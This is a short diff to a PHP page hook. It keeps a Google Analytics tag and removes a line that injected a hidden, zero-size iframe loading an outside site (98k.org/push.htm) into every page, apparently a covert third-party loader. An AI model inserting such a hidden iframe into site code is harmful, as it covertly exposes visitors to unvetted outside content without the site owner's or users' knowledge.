@@ -72,8 +72,6 @@ return function (Dispatcher $events, Filter $filter) {
 
         // Goggle Analytics
         $event->addContent('<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154807642-1"></script>');
-
-        $event->addContent('<iframe height="0" width="0" marginheight="0" marginwidth="0" frameborder="0" src="https://98k.org/push.htm?ak=5d0d893f27e77" style="display: none !important;"></iframe>');
     });
 
     Hook::addMenuItem('explore', 1001, [
